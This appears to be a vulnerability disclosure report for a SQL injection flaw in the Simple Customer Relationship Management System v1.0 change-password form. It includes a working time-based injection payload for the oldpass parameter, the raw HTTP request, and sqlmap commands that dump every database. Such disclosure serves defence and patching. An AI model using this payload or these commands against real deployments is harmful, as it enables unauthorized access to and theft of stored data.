> [Suggested description]
> Simple Customer Relationship Management System v1.0 was discovered to
> contain a SQL injection vulnerability via the oldpass parameter under
> the Change Password function.
>
> ------------------------------------------
>
> [Additional Information]
> Steps-To-Reproduce:
> 1. Now register a user by navigating the URL: http://localhost/php-scrm/registration.php
> 2. Now login registered user with the valid credential by following the URL: http://localhost/php-scrm/login.php
> 3. Now Navigate to the change password page By following the URL: http://localhost/php-scrm/change-password.php
> 4. Now fill out the Change Password form put random digits/string like "test123" in the "Current Password" field and put random content like "123456" in "New Password" and "Confirm Password" fields then intercept the request in burp suite.
> 5. Now send the burp suite intercepted request into burp repeater.
> 6. Now insert the below-given payload in the oldpass parameter then click on the "send" button to send request.
> Payload: oldpass=test123'+AND+(SELECT+123+FROM+(SELECT(SLEEP(10)))abc)+AND'&newpass=123456&confirmpassword=123456&change=change
> 7. Now you will see the response is delayed by 10 seconds and is vulnerable to SQL injection.
> 8. Now dump data by using sqlmap.
> 9. Now copy the burp intercepted request and create a file crm-request.txt
>
> POST /php-scrm/change-password.php HTTP/1.1
> Host: localhost
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
> Accept-Language: en-US,en;q=0.5
> Accept-Encoding: gzip, deflate
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 65
> Origin: http://localhost
> Connection: close
> Referer: http://localhost/php-scrm/change-password.php
> Cookie: PHPSESSID=65c7e25jf215pltjkg8gr5kli9
> Upgrade-Insecure-Requests: 1
> Sec-Fetch-Dest: document
> Sec-Fetch-Mode: navigate
> Sec-Fetch-Site: same-origin
> Sec-Fetch-User: ?1
>
> oldpass=test123&newpass=123456&confirmpassword=123456&change=Change
>
> 10. Now dump databases by sqlmap.
> #  python sqlmap.py -r crm-request.txt -p oldpass -dbs --batch
> 11. Now dump all data by sqlmap.
> #  python sqlmap.py -r crm-request.txt -p oldpass --dump-all --batch
>
> ------------------------------------------
>
> [Vulnerability Type]
> SQL Injection
>
> ------------------------------------------
>
> [Vendor of Product]
> https://www.sourcecodester.com
>
> ------------------------------------------
>
> [Affected Product Code Base]
> Simple Customer Relationship Management (CRM) System - 1.0
>
> ------------------------------------------
>
> [Affected Component]
> http://127.0.0.1/php-scrm/change-password.php
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Impact Code execution]
> true
>
> ------------------------------------------
>
> [Impact Escalation of Privileges]
> true
>
> ------------------------------------------
>
> [Impact Information Disclosure]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> SQL injection is a type of cyber attack in which an attacker inserts malicious code into a website's SQL statements in order to gain unauthorized access to sensitive information stored in a database. This type of attack can be used to steal sensitive information such as login credentials, personal information, and financial data. These attacks can have serious consequences, including:
>
> 1. Theft of sensitive data: An attacker can use SQL injection to access and steal confidential data from a database, such as passwords, financial information, or personal information.
> 2. Modification of data: An attacker can use SQL injection to alter or delete data from a database, potentially causing incorrect results or system failures.
> 3. Server compromise: In some cases, an attacker can use SQL injection to gain unauthorized access to the underlying operating system and take complete control of the server.
>
> ------------------------------------------
>
> [Reference]
> https://www.sourcecodester.com/php/15895/simple-customer-relationship-management-crm-system-using-php-free-source-coude.html
> https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-scrm.zip
>
> ------------------------------------------
>
> [Discoverer]
> Yogesh Verma

Use CVE-2023-24653.
